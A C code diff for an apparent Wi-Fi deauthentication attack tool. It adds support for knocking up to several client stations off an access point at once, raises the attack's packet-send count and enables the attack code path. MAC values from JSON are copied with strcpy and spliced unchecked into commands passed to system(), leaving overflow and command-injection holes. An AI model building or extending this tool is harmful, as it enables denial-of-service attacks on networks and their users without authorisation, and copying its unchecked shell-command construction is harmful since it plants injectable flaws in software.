@@ -89,7 +89,13 @@ void stop_sta_inter(void)
 {
 	StaInter = false;
 #ifdef ZRRJ
-	system("deauth_server stop");
+	if(AtkInfo.taget == ATK_TAGET_STA){
+		printf("deauth_multi_server stop\n");
+		system("deauth_multi_server stop");
+	}
+	else{
+		system("deauth_server stop");
+	}
 #endif
     usleep(100000);
 }
@@ -155,6 +161,7 @@ int wifi_atkpolicy_parse(cJSON* param_ap,cJSON* param_sta)
 	strcpy(AtkInfo.ap_mac,ap_mac->valuestring);
 	printf("atk ap mac %s\n",AtkInfo.ap_mac);
 #endif
+#ifndef MUL_GR
 	if(AtkInfo.taget == ATK_TAGET_STA){
 		cJSON* sta_mac = cJSON_GetObjectItem(param_sta, "mac");
 		if (sta_mac == NULL){
@@ -170,6 +177,24 @@ int wifi_atkpolicy_parse(cJSON* param_ap,cJSON* param_sta)
 #endif
 	//	memset(AtkInfo.sta_mac,0xff,6);
 	}
+#else
+	if(AtkInfo.taget == ATK_TAGET_STA){
+			cJSON* sta_mac = cJSON_GetObjectItem(param_sta, "mac");
+			int size = cJSON_GetArraySize(sta_mac);
+			if(size >MAX_GZ_NUM){
+				size=MAX_GZ_NUM;
+			}
+			AtkInfo.sta_num=size;
+			cJSON* array_item;
+			for (int i=0;i<size;i++){
+				array_item = cJSON_GetArrayItem(sta_mac, i);
+				if (array_item != NULL){
+					getmac(array_item->valuestring, 1, WifiAccess.sta_mac);
+					strcpy(AtkInfo.sta_mac[i],array_item->valuestring);
+				}
+			}
+	}
+#endif
 	cJSON* band = cJSON_GetObjectItem(param_ap, "band");
 	if(band == NULL){
 		printf ("band==NULL\n");
@@ -352,7 +377,7 @@ int getmac(char * macAddress_src, int strict, unsigned char * mac)
 
 	return 0;
 }
-#ifdef ZRRJ_11
+#ifdef ZRRJ
 /*****************************************************************
 * 函数描述：deauth攻击包发送线程回调处理函数，用于发送deauth数据包
 * 参数：	   void *argv 发包参数
@@ -369,7 +394,7 @@ void *do_deauth_atk(void *argv)
 		send_time =50;
 	}
 	else{
-		send_time=182;
+		send_time=300;
 	}
 	if(AtkInfo.band == ATK24DEVCHL){
 		ucchl=0;
@@ -404,9 +429,21 @@ void *do_deauth_atk(void *argv)
 	}
 	strcpy(cdev,UserCfgJson.wlan_dev[AtkInfo.band]);
 
-
+	printf("%s %d\n",UserCfgJson.wlan_dev[AtkInfo.band],AtkInfo.band);
 	if(AtkInfo.taget == ATK_TAGET_STA){
+#ifndef MUL_GR
+	//	sprintf(cmd,"deauth_server %s %d %d %s %s %d %d",cdev,AtkInfo.channel,1-ucchl,AtkInfo.sta_mac,AtkInfo.ap_mac,1,100);
 		sprintf(cmd,"deauth_server %s %d %s %s %d",cdev,0,AtkInfo.sta_mac,AtkInfo.ap_mac,send_time);
+#else
+
+		switch(AtkInfo.sta_num){
+			case 1:	sprintf(cmd,"deauth_multi_server %s %d %s %s 0 0 0 %d >/dev/null",cdev,0,AtkInfo.ap_mac,AtkInfo.sta_mac[0],100);break;
+			case 2:	sprintf(cmd,"deauth_multi_server %s %d %s %s %s 0 0 %d >/dev/null",cdev,0,AtkInfo.ap_mac,AtkInfo.sta_mac[0],AtkInfo.sta_mac[1],100);break;
+			case 3:	sprintf(cmd,"deauth_multi_server %s %d %s %s %s %s 0 %d >/dev/null",cdev,0,AtkInfo.ap_mac,AtkInfo.sta_mac[0],AtkInfo.sta_mac[1],AtkInfo.sta_mac[2],100);break;
+			case 4:	sprintf(cmd,"deauth_multi_server %s %d %s %s %s %s %s %d >/dev/null",cdev,0,AtkInfo.ap_mac,AtkInfo.sta_mac[0],AtkInfo.sta_mac[1],AtkInfo.sta_mac[2],AtkInfo.sta_mac[3],100);break;
+			default:sprintf(cmd,"deauth_multi_server %s %d %s %s %d >/dev/null",cdev,0,AtkInfo.sta_mac[0],AtkInfo.ap_mac,100);break;
+		}
+#endif
 	}
 	else{
 		sprintf(cmd,"deauth_server %s %d %s FF-FF-FF-FF-FF-FF %d",cdev,0,AtkInfo.ap_mac,send_time);
